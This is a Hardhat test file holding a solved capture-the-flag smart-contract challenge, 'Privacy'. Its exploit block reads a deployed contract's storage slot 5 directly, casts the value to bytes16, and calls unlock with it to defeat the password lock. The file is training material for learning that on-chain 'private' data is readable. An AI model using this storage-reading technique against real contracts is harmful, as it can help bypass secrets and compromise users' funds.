const { ethers } = require("hardhat");
const { expect } = require("chai");

/*

The creator of this contract was careful enough to protect the sensitive areas of its storage.

Unlock this contract to beat the level.

Things that might help:

- Understanding how storage works
- Understanding how parameter parsing works
- Understanding how casting works
Tips:

- Remember that metamask is just a commodity. Use another tool if it is presenting problems. Advanced gameplay could involve using remix, or your own web3 provider.

*/

describe("[Challenge] Privacy", function () {
  let deployer, attacker;

  before(async function () {
    /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
    [deployer, attacker] = await ethers.getSigners();

    this.privacy = await (
      await ethers.getContractFactory("Privacy", deployer)
    ).deploy([
      ethers.utils.formatBytes32String("aaaaaaaa"),
      ethers.utils.formatBytes32String("bbbbbbbb"),
      ethers.utils.formatBytes32String("cccccccc"),
    ]);
  });

  it("Exploit", async function () {
    /** CODE YOUR EXPLOIT HERE */

    // get data[2] = storage at slot 5
    const data = await ethers.provider.getStorageAt(this.privacy.address, 5);

    // cast bytes32 to bytes16
    const password = "0x" + data.slice(2, 34);

    await this.privacy.connect(attacker).unlock(password);
  });

  after(async function () {
    /** SUCCESS CONDITIONS */

    const locked = await this.privacy.locked();
    expect(locked).to.eq(false);
  });
});
